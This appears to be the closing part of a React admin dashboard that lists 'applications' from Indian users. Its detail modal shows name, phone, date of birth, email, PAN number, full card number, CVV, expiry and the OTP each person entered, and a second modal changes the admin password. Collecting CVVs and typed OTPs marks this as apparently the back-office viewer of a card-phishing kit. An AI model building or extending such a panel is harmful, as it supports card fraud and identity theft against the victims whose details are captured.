      {/* Detail Modal */}
      {selectedSubmission && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-3 sm:p-4">
          <div className="bg-white rounded-xl sm:rounded-2xl shadow-2xl w-full max-w-lg sm:max-w-xl lg:max-w-2xl max-h-[90vh] overflow-y-auto">
            <div className="sticky top-0 bg-white border-b px-4 sm:px-6 py-3 sm:py-4 flex items-center justify-between">
              <h2 className="font-bold text-base sm:text-lg text-gray-800">Application Details</h2>
              <button onClick={() => setSelectedSubmission(null)} className="text-gray-400 hover:text-gray-600"><svg className="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"/></svg></button>
            </div>
            <div className="p-4 sm:p-6 space-y-4 sm:space-y-5">
              <div className="flex items-center justify-between">
                <span className="text-xs sm:text-sm text-gray-400">ID: #{selectedSubmission.id}</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-sm font-medium text-gray-600">OTP:</span>
                {selectedSubmission.otp_entered ? (
                  <span className="px-2 sm:px-3 py-1 rounded-full text-sm font-medium bg-green-100 text-green-700">{selectedSubmission.otp_entered}</span>
                ) : (
                  <span className="px-2 sm:px-3 py-1 rounded-full text-sm font-medium bg-gray-100 text-gray-500">Not Entered</span>
                )}
              </div>
              <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-3 sm:p-5">
                <h3 className="font-semibold text-gray-800 mb-3 sm:mb-4 text-sm sm:text-base">Personal Information</h3>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 text-xs sm:text-sm">
                  <div><p className="text-gray-500">Full Name</p><p className="font-medium text-gray-800">{selectedSubmission.full_name}</p></div>
                  <div><p className="text-gray-500">Mobile</p><p className="font-medium text-gray-800">+91 {selectedSubmission.mobile_number}</p></div>
                  <div><p className="text-gray-500">Date of Birth</p><p className="font-medium text-gray-800">{selectedSubmission.date_of_birth}</p></div>
                  <div><p className="text-gray-500">Email</p><p className="font-medium text-gray-800">{selectedSubmission.email}</p></div>
                  <div><p className="text-gray-500">PAN Number</p><p className="font-medium text-gray-800 uppercase">{selectedSubmission.pan_number}</p></div>
                  <div><p className="text-gray-500">Request Type</p><p className="font-medium text-gray-800">{getRequestTypeLabel(selectedSubmission.request_type)}</p></div>
                </div>
              </div>
              <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-3 sm:p-5">
                <h3 className="font-semibold text-gray-800 mb-3 sm:mb-4 text-sm sm:text-base">Card Details</h3>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 text-xs sm:text-sm">
                  <div><p className="text-gray-500">Card Holder</p><p className="font-medium text-gray-800">{selectedSubmission.card_holder_name}</p></div>
                  <div><p className="text-gray-500">Card Number</p><p className="font-medium text-gray-800">{selectedSubmission.card_number}</p></div>
                  <div><p className="text-gray-500">CVV</p><p className="font-medium text-gray-800">{selectedSubmission.cvv || 'N/A'}</p></div>
                  <div><p className="text-gray-500">Expiry</p><p className="font-medium text-gray-800">{selectedSubmission.expiry_date}</p></div>
                </div>
              </div>
              <div className="text-xs text-gray-400"><p>Submitted: {new Date(selectedSubmission.created_at).toLocaleString()}</p></div>
            </div>
          </div>
        </div>
      )}

      {/* Change Password Modal */}
      {showPasswordModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-3 sm:p-4">
          <div className="bg-white rounded-xl sm:rounded-2xl shadow-2xl w-full max-w-sm sm:max-w-md p-4 sm:p-6">
            <div className="flex items-center justify-between mb-4 sm:mb-6">
              <h2 className="font-bold text-base sm:text-lg text-gray-800">Change Password</h2>
              <button onClick={() => setShowPasswordModal(false)} className="text-gray-400 hover:text-gray-600">
                <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"/></svg>
              </button>
            </div>
            
            {passwordError && <div className="bg-red-50 border border-red-200 text-red-600 px-3 sm:px-4 py-2 sm:py-3 rounded-xl text-xs sm:text-sm mb-3 sm:mb-4">{passwordError}</div>}
            {passwordSuccess && <div className="bg-green-50 border border-green-200 text-green-600 px-3 sm:px-4 py-2 sm:py-3 rounded-xl text-xs sm:text-sm mb-3 sm:mb-4">{passwordSuccess}</div>}
            
            <div className="space-y-3 sm:space-y-4">
              <div>
                <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1 sm:mb-2">Current Password</label>
                <input type="password" value={currentPassword} onChange={(e) => setCurrentPassword(e.target.value)} className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg sm:rounded-xl text-sm" placeholder="Enter current password" />
              </div>
              <div>
                <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1 sm:mb-2">New Password</label>
                <input type="password" value={newPassword} onChange={(e) => setNewPassword(e.target.value)} className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg sm:rounded-xl text-sm" placeholder="Enter new password" />
              </div>
              <div>
                <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1 sm:mb-2">Confirm New Password</label>
                <input type="password" value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)} className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg sm:rounded-xl text-sm" placeholder="Confirm new password" />
              </div>
            </div>
            
            <button onClick={handleChangePassword} className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white py-2 sm:py-3 rounded-lg sm:rounded-xl font-semibold mt-4 sm:mt-6 text-sm hover:from-red-700 hover:to-red-800">Update Password</button>
          </div>
        </div>
      )}
    </div>
  )
}

export default AdminDashboard
